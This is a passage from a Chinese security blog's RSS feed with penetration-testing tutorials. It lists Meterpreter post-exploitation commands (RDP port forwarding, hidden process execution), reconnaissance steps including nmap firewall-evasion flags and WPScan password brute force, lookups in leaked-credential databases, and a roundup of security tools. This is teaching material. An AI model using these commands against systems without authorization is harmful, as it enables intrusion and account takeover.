class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>文件系统命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token comment" spellcheck="true"># 查看文件内容  </span>getwd <span class="token comment" spellcheck="true"># 查看当前工作目录  </span>upload  <span class="token comment" spellcheck="true"># 上传文件到目标机上  </span>download <span class="token comment" spellcheck="true"># 下载文件到本机上  </span>edit <span class="token comment" spellcheck="true"># 编辑文件  </span>search  <span class="token comment" spellcheck="true"># 搜索文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>网络命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash">ipconfig / <span class="token function">ifconfig</span> <span class="token comment" spellcheck="true"># 查看网络接口信息  </span>portfwd  add -l 4444 -p 3389 -r 192.168.1.102 <span class="token comment" spellcheck="true"># 端口转发，本机监听4444，把目标机3389转到本机4444 </span>rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 <span class="token comment" spellcheck="true">#然后使用rdesktop来连接，-u 用户名 -p 密码</span>route <span class="token comment" spellcheck="true"># 获取路由表信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>系统命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> <span class="token comment" spellcheck="true"># 查看当前活跃进程 </span>migrate pid <span class="token comment" spellcheck="true"># 将Meterpreter会话移植到进程数位pid的进程中 </span>execute -H -i -f cmd.exe <span class="token comment" spellcheck="true"># 创建新进程cmd.exe，-H不可见，-i交互 </span>getpid <span class="token comment" spellcheck="true"># 获取当前进程的pid </span><span class="token function">kill</span> pid <span class="token comment" spellcheck="true"># 杀死进程 </span>getuid <span class="token comment" spellcheck="true"># 查看权限 </span>sysinfo <span class="token comment" spellcheck="true"># 查看目标机系统信息，如机器名，操作系统等 </span><span class="token function">shutdown</span> <span class="token comment" spellcheck="true"># 关机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="REF："><a href="#REF：" class="headerlink" title="REF："></a>REF：</h2><p><a href="https://paper.seebug.org/29/">meterpreter相关教程包括后渗透攻击</a></p><p><a href="https://www.cnblogs.com/LyShark/p/12189163.html">Metasploit 生成各种攻击载荷</a></p><p><a href="https://lipeilipei.top/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/">各种姿势反弹shell</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/09/28/pt-metosploitInAliyun/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>信息收集</title>
      <link>https://m01ly.github.io/2020/09/28/pt-info-collection/</link>
      <guid>https://m01ly.github.io/2020/09/28/pt-info-collection/</guid>
      <pubDate>Mon, 28 Sep 2020 03:14:51 GMT</pubDate>
      
      <description>&lt;p&gt;江湖上流传着这样一句话，渗透测试的本质就是信息收集，一次成功的渗入，百分之80的时间都花在了信息收集上，信息收集真的这么重要么？那么具体要收集什么信息呢？&lt;/p&gt;
&lt;p&gt;信息收集主要是收集服务器的配置信息和网站的敏感信息，主要包括域名信息、子域名信息、目标网站信息、目标网站真实IP、目录文件、开放端口和服务、中间件信息、脚本语言等等等。 &lt;strong&gt;汇总图如下？？？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在进行信息收集的时候，我们既要全面详细的获取目标的信息，又要尽量隐藏自己不被发现。尽量用网络搜集，用工具收集时适当挂代理&lt;/strong&gt;。因此主要从网络搜集和工具搜集两种方式去逐个介绍。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>江湖上流传着这样一句话，渗透测试的本质就是信息收集，一次成功的渗入，百分之80的时间都花在了信息收集上，信息收集真的这么重要么？那么具体要收集什么信息呢？</p><p>信息收集主要是收集服务器的配置信息和网站的敏感信息，主要包括域名信息、子域名信息、目标网站信息、目标网站真实IP、目录文件、开放端口和服务、中间件信息、脚本语言等等等。 <strong>汇总图如下？？？</strong></p><p><strong>在进行信息收集的时候，我们既要全面详细的获取目标的信息，又要尽量隐藏自己不被发现。尽量用网络搜集，用工具收集时适当挂代理</strong>。因此主要从网络搜集和工具搜集两种方式去逐个介绍。</p><a id="more"></a><h1 id="1-域名信息"><a href="#1-域名信息" class="headerlink" title="1 域名信息"></a>1 域名信息</h1><p>域名信息：whois信息，备案信息</p><h2 id="1-1-whois信息"><a href="#1-1-whois信息" class="headerlink" title="1.1 whois信息"></a>1.1 whois信息</h2><p>关注的重点是注册商、注册人、邮件、DNS解析服务器、注册人联系电话。 </p><p>Kali的查询：whois -h 注册服务器地址  域名  .例如：whoid freebuf.com</p><p> 站长工具-站长之家域名WHOIS信息查询地址：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站网域名WHOIS信息查询地址：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>腾讯云域名WHOIS信息查询地址：<a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p><p>国外的who.is：<a href="https://who.is/">https://who.is/</a> </p><p>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> </p><p>Virus Total:<a href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p><img src="/2020/09/28/pt-info-collection/1599205057130.png" alt="1599205057130"></p><h2 id="1-2-备案信息"><a href="#1-2-备案信息" class="headerlink" title="1.2 备案信息"></a>1.2 备案信息</h2><p>备案查询我们主要关注的是：单位信息例如名称、备案编号、网站负责人、法人、电子邮箱、联系电话等。 </p><p>常见查询备案信息的网站如下：</p><p>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> </p><p>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a> </p><p>国家企业信用信息公示系统：<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a> </p><p>爱站的备案查询：<a href="https://icp.aizhan.com/">https://icp.aizhan.com</a></p><p><img src="/2020/09/28/pt-info-collection/1599205081019.png" alt="1599205081019"></p><h1 id="2-子域名收集"><a href="#2-子域名收集" class="headerlink" title="2 子域名收集"></a>2 子域名收集</h1><p>子域名也就是二级域名，是指顶级域名下的域名。收集的子域名越多，我们测试的目标就越多，目标系统渗透成功的机率也越大。主站无懈可击的时候子域名是一个很好的突破口。</p><h2 id="2-1-网络搜索"><a href="#2-1-网络搜索" class="headerlink" title="2.1  网络搜索"></a>2.1  网络搜索</h2><h2 id="2-1-1-搜索引擎"><a href="#2-1-1-搜索引擎" class="headerlink" title="2.1.1 搜索引擎"></a>2.1.1 搜索引擎</h2><p> 可以利用Google、Bing 、shodan和百度这样的搜索引擎进行搜索查询 ，要掌握黑客语法，具体如下：</p><p>Google搜索语法：<a href="https://www.dazhuanlan.com/2019/08/15/5d55112f06e84/">https://www.dazhuanlan.com/2019/08/15/5d55112f06e84/</a></p><p>Bing搜索语法：<a href="https://blog.csdn.net/hansel/article/details/53886828">https://blog.csdn.net/hansel/article/details/53886828</a></p><p>百度搜索语法：<a href="https://www.cnblogs.com/k0xx/p/12794452.html">https://www.cnblogs.com/k0xx/p/12794452.html</a></p><p>搜索实例：</p><p><img src="/2020/09/28/pt-info-collection/1599205666073.png" alt="1599205666073"></p><h2 id="2-1-2-在线网站"><a href="#2-1-2-在线网站" class="headerlink" title="2.1.2 在线网站"></a>2.1.2 在线网站</h2><p>（1）<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><p>（2）<a href="http://i.links.cn/subdomain/%EF%BC%88">http://i.links.cn/subdomain/（</a></p><p>（3）<a href="http://dns.aizhan.com/">http://dns.aizhan.com</a></p><p>（4）<a href="http://z.zcjun.com/%EF%BC%88%E5%93%8D%E5%BA%94%E5%BE%88%E5%BF%AB,%E6%8E%A8%E8%8D%90%EF%BC%89">http://z.zcjun.com/（响应很快,推荐）</a></p><p>（5）Github搜索子域名</p><p><img src="/2020/09/28/pt-info-collection/1599206150013.png" alt="1599206150013"></p><h2 id="2-2-工具搜集"><a href="#2-2-工具搜集" class="headerlink" title="2.2 工具搜集"></a>2.2 工具搜集</h2><p>检测工具有很多，但重要的是需要日常完善字典，字典强大才是硬道理。常见的有</p><p>layer子域名挖掘机、Sublist3r、subDomainsBrute、K8、orangescan、DNSRecon、dnsmaper、wydomain等等，重点推荐layer子域名挖掘机（使用简单，界面细致）、Sublist3r（列举多资源下查到的域名）和subDomainsBrute。（递归查询多级域名），此类工具github都有下载地址和使用方法。</p><p>链接如下：</p><p>SubDomainBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><p>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p><p>Layer（5.0增强版）：<a href="https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q">https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q</a> 密码:aup5</p><p><a href="https://d.chinacycc.com/">https://d.chinacycc.com</a>（大佬推荐的说好用的很，但是收费。）</p><h1 id="3-真实IP收集"><a href="#3-真实IP收集" class="headerlink" title="3 真实IP收集"></a>3 真实IP收集</h1><p>信息收集工程中IP地址是必不可少的，在域名收集工程中我们已经对ip段收集，whois、ping测试、指纹网站都可以探测ip地址，但是很多目标服务器存在CDN，那什么是CDN，如果饶过查找真实IP呢？</p><p>CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，只有在实际数据交互时才会从远程web服务器响应，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><h2 id="3-1-绕过cdn"><a href="#3-1-绕过cdn" class="headerlink" title="3.1 绕过cdn"></a>3.1 绕过cdn</h2><p><strong>3.1.1 确定有无cdn</strong></p><p>（1）很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></p><p>(2)使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p><p><strong>3.1.2 绕过cdn</strong></p><h2 id="3-2-c段，旁站ip"><a href="#3-2-c段，旁站ip" class="headerlink" title="3.2 c段，旁站ip"></a>3.2 c段，旁站ip</h2><p>旁站：是和目标网站在同一台服务器上的其它的网站。</p><p>C端：是和目标服务器ip处在同一个C段的其它服务器。</p><h3 id="3-2-1-网站扫描"><a href="#3-2-1-网站扫描" class="headerlink" title="3.2.1 网站扫描"></a>3.2.1 网站扫描</h3><p><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></p><p> <a href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a>  </p><p><a href="https://phpinfo.me/bing.php%EF%BC%88%E5%8F%AF%E8%83%BD%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%EF%BC%89">https://phpinfo.me/bing.php（可能访问不了）</a></p><h3 id="3-2-2-工具"><a href="#3-2-2-工具" class="headerlink" title="3.2.2 工具"></a>3.2.2 工具</h3><p>神器   ： <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><p>御剑1.5：<strong><a href="https://download.csdn.net/download/peng119925/10722958">https://download.csdn.net/download/peng119925/10722958</a></strong></p><p>C端查询：IIS PUT Scanner（扫描速度快，自定义端口，有banner信息）</p><p>Nmap：语法：nmap  -p  80,8080  –open  ip/24 </p><h1 id="4-端口信息"><a href="#4-端口信息" class="headerlink" title="4 端口信息"></a>4 端口信息</h1><p>对网站域名对应的真实IP地址进行端口测试，很多有防护不能大批量扫描和漏洞测试。</p><h2 id="4-1-网站"><a href="#4-1-网站" class="headerlink" title="4.1 网站"></a>4.1 网站</h2><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p><a href="https://tool.lu/portscan/index.html">https://tool.lu/portscan/index.html</a> </p><h2 id="4-2-工具"><a href="#4-2-工具" class="headerlink" title="4.2 工具"></a>4.2 工具</h2><p>常见工具就是nmap(功能强大)、masscan、zmap和御剑tcp端口高速扫描工具(较快)。</p><p>扫描思路：我们可以在收集子域对应的的ip后整理到txt中，然后nmap批量端口扫描、服务爆破和漏洞扫描，前提是不被封禁IP，可采用代理池。</p><p>nmap -iL ip.txt –script=auth,vuln &gt; finalscan.txt 扫描导出常见端口和漏洞。</p><p>常见端口说明和攻击方向整理如下：<a href="https://m01ly.github.io/2020/09/04/pt-portinfo/">https://m01ly.github.io/2020/09/04/pt-portinfo/</a></p><pre><code> nmap 10.0.1.161  -p 1-65535 </code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap 过防火墙参数：-mtu 数据包最大传输单元--data-length 设置数据包的长度--scan-delay  延迟一定的时间发包，主要用于绕过频率的限制--randomize-hosts 对批量目标随机IP进行扫描，适合批量目标一起扫的情况<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大部分情况下使用上面的参数或者多个参数进行组合即可绕过防火墙进行扫描。</p><h1 id="5-网站信息收集"><a href="#5-网站信息收集" class="headerlink" title="5  网站信息收集"></a>5  网站信息收集</h1><p> 网站信息信息收集主要是：操作系统，中间件，脚本语言，数据库，服务器，web容器、waf、cdn、cms、历史漏洞、dns区域传送等，可以使用以下方法查询。 </p><p> 常见指纹工具：御剑web指纹识别、轻量级web指纹识别、whatweb等 </p><h2 id="5-1-web指纹"><a href="#5-1-web指纹" class="headerlink" title="5.1 web指纹"></a>5.1 web指纹</h2><p>web指纹：操作系统，框架，脚本语言，web容器，服务器，数据库，版本号等</p><p>潮汐指纹：<a href="http://finger.tidesec.net/%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89">http://finger.tidesec.net/（推荐）</a></p><p>云悉(现在需要邀请码)：<a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a></p><p>CMS指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><h2 id="5-2-Waf-识别"><a href="#5-2-Waf-识别" class="headerlink" title="5.2 Waf 识别"></a>5.2 Waf 识别</h2><h3 id="5-2-1-wafw00f"><a href="#5-2-1-wafw00f" class="headerlink" title="5.2.1 wafw00f"></a>5.2.1 wafw00f</h3><p>kali上自带wafw00f，一条命令直接使用。建议最好在kali下使用，windows下的使用很麻烦。Nmap上也包含识别waf指纹的脚本模块。 </p><p>下载地址： <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a>  </p><p>WAFW00F探测WAF </p><pre><code>命令：wafw00f  -a  域名</code></pre><h3 id="5-2-2-nmap"><a href="#5-2-2-nmap" class="headerlink" title="5.2.2 nmap"></a>5.2.2 nmap</h3><p>Nmap探测WAF有两种脚本。</p><p>一种是http-waf-detect。</p><pre><code>命令：nmap  -p80,443  --script=http-waf-detect  ip</code></pre><p>一种是http-waf-fingerprint。</p><pre><code>命令：nmap  -p80,443  --script=http-waf-fingerprint  ip</code></pre><h1 id="6-敏感目录文件收集"><a href="#6-敏感目录文件收集" class="headerlink" title="6 敏感目录文件收集"></a>6 敏感目录文件收集</h1><p>攻防测试中探测web目录和隐藏的敏感文件是很重要环境，从中可以获取网站后台管理页面、文件上传界面、备份文件、WEB-INF、robots、svn和源代码等。</p><p>主要通过工具扫描，主要有</p><p>（0）御剑–很强大（互联网有很多字典加强版）</p><p>（1） dirb   目录爆破dirb是必用的一款工具，因为它可以做目录的递归爆破</p><p>（2）7kbstorm <a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p><p> （3）搜索引擎（Google、baidu、bing等），搜索引擎搜索敏感文件也较为常见，一般是这样：site:xxx.xxx filetype:xls。 </p><p> （4）爬虫-扫描器（AWVS、Burpsuite、Nessus等） </p><p> （5）BBscan（lijiejie大佬的脚本：<a href="https://github.com/lijiejie/BBScastorn">https://github.com/lijiejie/BBScastorn</a> ） </p><p> （6）凌风云搜索：<a href="https://www.lingfengyun.com/%EF%BC%88%E9%83%A8%E5%88%86%E7%94%A8%E6%88%B7%E5%8F%AF%E8%83%BD%E4%B8%8A%E4%BC%A0%E4%BA%91%E7%9B%98%E8%A2%AB%E5%9C%A8%E7%BA%BF%E6%8A%93%E5%8F%96%EF%BC%89">https://www.lingfengyun.com/（部分用户可能上传云盘被在线抓取）</a> </p><p> （6）github搜索</p><h1 id="7-社会工程学收集"><a href="#7-社会工程学收集" class="headerlink" title="7 社会工程学收集"></a>7 社会工程学收集</h1><p>我们可以通过社工库查询一些关键信息。对于很多社工库来说，存储达到T，数据量达到亿级别都是小case。内容方面包括帐号密码、邮箱地址、个人信息等等。</p><p>互联网社工库，威力有多大，就看数据库的数量和质量了，理论上达到了一定的量，很多的东西都是可以查的出来的，特别是那些基本所有网站都一个密码的，只要一个社工库的收集的其中一个数据库有他的帐号密码，那么查出来的密码就可以直接登陆该用户的其他帐号了。</p><h1 id="8-常见CMS扫描"><a href="#8-常见CMS扫描" class="headerlink" title="8 常见CMS扫描"></a>8 常见CMS扫描</h1><h2 id="8-1-wordpress"><a href="#8-1-wordpress" class="headerlink" title="8.1 wordpress"></a>8.1 wordpress</h2><p> <code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。 </p><h3 id="8-1-1-安装教程"><a href="#8-1-1-安装教程" class="headerlink" title="8.1.1 安装教程"></a>8.1.1 安装教程</h3><p>（1）安装：</p><p>windows平台不支持，kaili系统自带，其他平台安装教程见：<a href="https://xz.aliyun.com/t/2794">https://xz.aliyun.com/t/2794</a></p><p>你可以使用下列命令在自己的设备中安装WPScan</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/wpscanteam/wpscan.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）更新</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --update <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-1-2-使用"><a href="#8-1-2-使用" class="headerlink" title="8.1.2 使用"></a>8.1.2 使用</h3><p><strong>（1）扫描漏洞</strong></p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxx.wiki/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果中红色为高危漏洞，绿色为Info</p><p><strong>（2）扫描用户</strong></p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxxxx.wiki/ --enumerate u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取用户名后，可以进一步加字典爆破：</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxx.wiki/ -e u --wordlist /root/password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(3) 扫描插件漏洞</p><p>扫描所用插件：</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxx.wiki/ -enumerate p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描插件漏洞：</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxx.wiki/ -enumerate vp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(4)扫描主题</p><p>扫描主题：wpscan –url <a href="https://www.xxxxx.wiki/">https://www.xxxxx.wiki</a> –enumerate t</p><p>扫描主题漏洞：wpscan –url <a href="https://www.xxxxxx.wiki/">https://www.xxxxxx.wiki</a> –enumerate vt</p><p>(5)文件漏洞扫描</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxxx.wiki/ -enumerate tt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://xz.aliyun.com/t/2794">https://xz.aliyun.com/t/2794</a></p><h1 id="9-福利"><a href="#9-福利" class="headerlink" title="9 福利"></a>9 福利</h1><h2 id="9-1-强大的搜索引擎"><a href="#9-1-强大的搜索引擎" class="headerlink" title="9.1 强大的搜索引擎"></a>9.1 强大的搜索引擎</h2><p>ZoomEy：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a> </p><p>FoFa：<a href="https://fofa.so/">https://fofa.so/</a> </p><p>Dnsdb：<a href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a> </p><p>Shodan：<a href="https://www.shodan.io/">https://www.shodan.io/</a> </p><p>Censys：<a href="https://censys.io/">https://censys.io/</a> </p><p>御剑全家桶：<a href="http://www.moonsec.com/post-753.html">http://www.moonsec.com/post-753.html</a> </p><h2 id="9-2-工具"><a href="#9-2-工具" class="headerlink" title="9.2 工具"></a>9.2 工具</h2><p><a href="https://zhuanlan.zhihu.com/p/53112370">2019年Github上开源的安全渗透攻击类工具</a></p><p><a href="https://bbs.pediy.com/thread-261711.htm"> 2020版 github渗透测试工具库</a></p><p>参考：</p><p><a href="https://www.freebuf.com/articles/web/243210.html">https://www.freebuf.com/articles/web/243210.html</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/09/28/pt-info-collection/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>最佳网络安全和黑客软件</title>
      <link>https://m01ly.github.io/2020/09/28/pt-tools/</link>
      <guid>https://m01ly.github.io/2020/09/28/pt-tools/</guid>
      <pubDate>Mon, 28 Sep 2020 03:14:51 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;1-Probely&quot;&gt;&lt;a href=&quot;#1-Probely&quot; class=&quot;headerlink&quot; title=&quot;1.Probely&quot;&gt;&lt;/a&gt;1.Probely&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://probely.com/web-vulnerability-scanner/security-teams/&quot;&gt;https://probely.com/web-vulnerability-scanner/security-teams/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;probly扫描网络中的漏洞，帮助安全专业人员识别关键漏洞并及时修复。主要功能包括扫描SQL注入、XSS、应用程序漏洞等等。通过与JIRA和Slack的深入集成，此工具允许多个团队成员为整个网络评估过程做出贡献。入侵检测机制是一个额外的优势，以及各种网络报告。Probely扫描您的网络，不会留下任何东西，为安全专业人员带来更好的可见性。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Probely"><a href="#1-Probely" class="headerlink" title="1.Probely"></a>1.Probely</h1><p><a href="https://probely.com/web-vulnerability-scanner/security-teams/">https://probely.com/web-vulnerability-scanner/security-teams/</a></p><p>probly扫描网络中的漏洞，帮助安全专业人员识别关键漏洞并及时修复。主要功能包括扫描SQL注入、XSS、应用程序漏洞等等。通过与JIRA和Slack的深入集成，此工具允许多个团队成员为整个网络评估过程做出贡献。入侵检测机制是一个额外的优势，以及各种网络报告。Probely扫描您的网络，不会留下任何东西，为安全专业人员带来更好的可见性。</p><a id="more"></a><h1 id="2-Netsparker"><a href="#2-Netsparker" class="headerlink" title="2.Netsparker"></a>2.Netsparker</h1><p><a href="https://www.netsparker.com/">https://www.netsparker.com/</a></p><p>Netsparket是另一个漏洞评估工具，它扫描网络中的SQL注入、XSS和其他web应用程序漏洞。这是一个云端和场所。Netsparket的最佳优点包括基于扫描技术的精确检测和特定证据。它还检测URL重写和404错误页面，以及与bug跟踪协议的无缝集成。高速扫描将是另一个特长，它可以在一天内扫描1000个网络应用程序。</p><h1 id="3-Wallarm"><a href="#3-Wallarm" class="headerlink" title="3.Wallarm"></a>3.Wallarm</h1><p><a href="https://wallarm.com/">https://wallarm.com/</a></p><p>Wallarm结合了机器学习来模拟api、应用程序和其他服务的安全性。这种与机器学习的集成使它能够测试并帮助DevOps部门在整个网络基础设施中设计更好的工作流。Wallarm的自动化WAF将与公共云、私有云和混合云协同工作，最终与AWS、CNCF和Google建立了良好的合作关系。Wallarm中的AI引擎帮助开发人员识别数据模式，利用引擎先前的遭遇消除弱点，帮助他们开发强大的安全代码，</p><h1 id="4-Acunetix"><a href="#4-Acunetix" class="headerlink" title="4.Acunetix"></a>4.Acunetix</h1><p><a href="https://www.acunetix.com/">https://www.acunetix.com/</a></p><p>Acunetix是安全专业人士最好的软件之一，因为它模仿黑客，从而使安全专业人士领先网络罪犯一步。它负责HTML5、JavaScript、SQL注入、XSS等等。所有的web应用程序和服务都被清楚地监控，以便更好地为任何意外的失败做好准备。除了web应用程序的漏洞之外，这一个还负责WordPress核心和插件。凭借快速扫描功能，Acunetix也是一个重要的软件安全专业人士需要拥有的。</p><h1 id="5-BurpSuite"><a href="#5-BurpSuite" class="headerlink" title="5.BurpSuite"></a>5.BurpSuite</h1><p><a href="https://portswigger.net/">https://portswigger.net/</a></p><p>Burpuite是一款优秀的web应用程序安全和黑客软件，用于安全测试；它的功能提供了重要的渗透测试程序。从映射到应用程序攻击向量的分析，这个工具是渗透测试团队的正确软件包。自动扫描程序、漏洞管理框架、广泛的法规遵从性报告、详细的扫描方法使Burpuite成为下一代安全评估工具。</p><h1 id="6-Angry-IP-Scanner"><a href="#6-Angry-IP-Scanner" class="headerlink" title="6.Angry IP Scanner"></a>6.Angry IP Scanner</h1><p><a href="https://angryip.org/">https://angryip.org/</a></p><p>Angry IP scanner是一款开源黑客软件，涵盖跨平台，为安全专业人士提供道德黑客功能。扫描本地网络、文件、命令行界面，以及许多数据获取程序，还可以帮助进行大量的数据导出。</p><h1 id="7-Qualys-Guard"><a href="#7-Qualys-Guard" class="headerlink" title="7.Qualys Guard"></a>7.Qualys Guard</h1><p><a href="https://www.qualys.com/">https://www.qualys.com/</a></p><p>Qualy Guard是另一家主要的安全供应商，帮助企业简化网络的安全性和法规遵从性。这个网络安全和黑客软件也有助于企业检查他们的云系统漏洞。处理数据漏洞、可见性、数据分析、实时威胁等。可靠性、准确性和简单性是Qualyguard的最佳优势。</p><h1 id="8-HashCat"><a href="#8-HashCat" class="headerlink" title="8.HashCat"></a>8.HashCat</h1><p><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p><p>HashCat是一个密码破解软件，它可以帮助恢复忘记的密码，并检查密码历史记录以执行审核和报告。</p><p>它是一个开放源代码平台，涵盖跨平台，负责同一网络内的多个设备，该平台配有集成的热监视器、内置基准系统，并支持分布式破解网络。最重要的是，它还支持网络的自动性能管理。</p><h1 id="REF："><a href="#REF：" class="headerlink" title="REF："></a>REF：</h1><p><a href="https://www.softwaretestinghelp.com/penetration-testing-tools/">https://www.softwaretestinghelp.com/penetration-testing-tools/</a></p><p><a href="https://www.guru99.com/learn-everything-about-ethical-hacking-tools-and-skills.html">https://www.guru99.com/learn-everything-about-ethical-hacking-tools-and-skills.html</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/09/28/pt-tools/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>小白如何在三天一步步逆向app，找到私钥</title>
      <link>https://m01ly.github.io/2020/09/18/mobilesecurity-experience/</link>
      <guid>https://m01ly.github.io/2020/09/18/mobilesecurity-experience/</guid>
      <pubDate>Fri, 18 Sep 2020 09:02:36 GMT</pubDate>
      
      <description>&lt;p&gt;本人今年应届生，就职于甲方安全，研究生期间主要做开发，偶尔做做渗透，护护网；工作了呢，主要维护内部系统的安全，对于移动逆向这块，只简单用burpsuite，顺顺利利抓过app的包。突然有一天，老大说，有个app，fiddler抓包，服务器不响应客户端发的包，让看看咋回事？于是就有了接下来三天不吃不喝不眠不休的入坑爬坑的过程~·所有用到的工具，都在文章开头列出&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本人今年应届生，就职于甲方安全，研究生期间主要做开发，偶尔做做渗透，护护网；工作了呢，主要维护内部系统的安全，对于移动逆向这块，只简单用burpsuite，顺顺利利抓过app的包。突然有一天，老大说，有个app，fiddler抓包，服务器不响应客户端发的包，让看看咋回事？于是就有了接下来三天不吃不喝不眠不休的入坑爬坑的过程~·所有用到的工具，都在文章开头列出</p><a id="more"></a><h1 id="1-工具"><a href="#1-工具" class="headerlink" title="1  工具"></a>1  工具</h1><h2 id="1-1-抓包工具"><a href="#1-1-抓包工具" class="headerlink" title="1.1 抓包工具"></a>1.1 